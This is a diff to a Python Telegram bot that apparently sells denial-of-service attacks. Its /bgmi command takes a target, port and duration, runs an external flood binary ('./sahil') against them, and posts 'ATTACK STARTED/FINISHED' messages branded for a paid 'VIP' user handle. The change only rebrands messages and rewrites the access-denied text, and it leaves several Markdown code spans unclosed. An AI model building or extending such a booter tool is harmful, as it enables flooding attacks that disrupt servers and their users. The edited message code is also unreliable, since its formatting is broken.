@@ -228,10 +228,10 @@ def handle_bgmi(message):
                 
                 # Stylish attack start message
                 bot.reply_to(message, f"🔥 **ATTACK STARTED!** 🔥\n\n"
-                                      f"🎯 **Target:** `{target}`\n"
-                                      f"🚀 **Port:** `{port}`\n"
-                                      f"⏳ **Duration:** `{time} seconds`\n"
-                                      f"🛠️ **Method:** `VIP USER OF @YourBot`", 
+                                      f"🎯 **Target:** `{target}`"
+                                      f"🚀 **Port:** `{port}`"
+                                      f"⏳ **Duration:** `{time} seconds`"
+                                      f"🛠️ **Method:** `VIP USER OF @SLAYER_OP7`", 
                                       parse_mode="Markdown")
 
                 full_command = f"./sahil {target} {port} {time}"
@@ -239,16 +239,16 @@ def handle_bgmi(message):
 
                 # Stylish attack completion message
                 bot.reply_to(message, f"✅ **ATTACK FINISHED!** ✅\n\n"
-                                      f"🎯 **Target:** `{target}`\n"
-                                      f"🚀 **Port:** `{port}`\n"
-                                      f"⏳ **Duration:** `{time} seconds`\n"
-                                      f"🛠️ **Method:** `VIP USER OF @SLAYER_OP7`\n\n"
+                                      f"🎯 **Target:** `{target}"
+                                      f"🚀 **Port:** `{port}`"
+                                      f"⏳ **Duration:** `{time} seconds"
+                                      f"🛠️ **Method:** `VIP USER OF @SLAYER_OP7"
                                       f"💪 *Mission Accomplished!* 🎯", 
                                       parse_mode="Markdown")
         else:
             response = "✅Usage:- /bgmi <target> <port> <time>"
     else:
-        response = "🚫 You are **not authorized** to use this command."
+        response = "🚫 PEHLE ACCESS LEKR AA JA AB @SLAYER_OP7."
     
     bot.reply_to(message, response)
 
